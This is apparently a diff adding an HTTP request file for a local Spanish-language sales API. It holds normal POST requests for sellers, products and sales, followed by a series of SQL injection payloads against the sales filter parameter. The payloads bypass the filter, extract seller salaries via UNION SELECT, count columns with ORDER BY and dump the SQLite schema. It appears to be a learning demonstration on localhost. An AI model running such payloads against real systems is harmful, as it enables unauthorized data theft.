@@ -1,0 +1,46 @@
+POST http://localhost:3000/api/vendedor
+Content-Type: application/json
+{
+  "nombre": "Juan Perez",
+  "salario": 35000
+}
+
+POST http://localhost:3000/api/producto
+Content-Type: application/json
+{
+  "nombre": "Laptop",
+  "tipo": "Electrónico"
+}
+
+POST http://localhost:3000/api/venta 
+Content-Type: application/json
+{
+  "vendedorId": 1,
+  "productoId": 1,
+  "valor": 1500
+}
+
+//busca por nombre de vendedor
+GET http://localhost:3000/api/venta?filter=
+
+//consultas funny
+
+//Trae todas las ventas ignorando el filtro del nombre:
+GET http://localhost:3000/api/venta?filter=' OR 1=1 --
+
+//Trae los datos del vendedor:
+GET http://localhost:3000/api/venta?filter=' UNION SELECT id, nombre, salario, NULL, NULL FROM vendedor --
+
+
+//Podríamos hacer las siguientes consultas para averiguar la cantidad de columnas que tiene la tabla:
+
+GET http://localhost:3000/api/venta?filter=' ORDER BY 1 --
+GET http://localhost:3000/api/venta?filter=' ORDER BY 2 --
+GET http://localhost:3000/api/venta?filter=' ORDER BY 3 --
+...
+
+//Trae la estructura de las tablas:
+GET http://localhost:3000/api/venta?filter=' UNION SELECT 1, name, sql, 4, 5 FROM sqlite_master WHERE type='table' --
+
+
+
